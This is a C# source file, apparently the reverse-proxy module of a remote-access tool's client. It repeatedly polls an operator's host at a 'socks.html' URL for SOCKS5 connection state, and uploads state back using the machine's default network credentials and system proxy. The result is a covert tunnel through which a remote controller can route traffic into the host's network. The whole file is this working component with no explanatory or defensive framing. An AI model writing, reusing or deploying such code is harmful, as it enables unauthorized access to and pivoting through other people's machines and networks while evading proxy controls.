using System;
using System.IO;
using System.Net;
using Socks5Client;

namespace Client.HandlePacket
{
    internal static class HandleReverseProxy
    {
        public static bool _enabled = true;
        private static string _url = string.Empty;

        public static void StartReceive(string ip, string port)
        {
            _url = $"http://{ip}:{port}/socks.html";
            _enabled = true;

            while (_enabled)
                try
                {
                    var request = (HttpWebRequest) WebRequest.Create(_url);
                    request.Proxy = null;
                    using (var response = (HttpWebResponse) request.GetResponse())
                    {
                        if (response.StatusCode == HttpStatusCode.OK)
                            using (var stream = response.GetResponseStream())
                            {
                                using (var reader = new StreamReader(stream))
                                {
                                    var result = reader.ReadToEnd();
                                    if (!string.IsNullOrEmpty(result))
                                    {
                                        var serializer = new Socks5Client.Serializer();
                                        var Socks5State = serializer.Deserialize(result);
                                        ConnectionManager.UpdateConnection(Socks5State);
                                    }
                                }
                            }
                    }

                    request = null;
                }
                catch(Exception ex) 
                {
                    Console.WriteLine(ex.Message);
                }
        }

        public static void StopReceive()
        {
            _enabled = false;
        }

        public static void Send(Socks5State Socks5State)
        {
            try
            {
                using (var client = new WebClient())
                {
                    var serializer = new Socks5Client.Serializer();
                    client.UseDefaultCredentials = true;
                    client.Proxy = WebRequest.DefaultWebProxy;
                    client.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                    client.UploadString(_url, serializer.Serialize(Socks5State));
                }
            }
            catch { }
        }
    }
}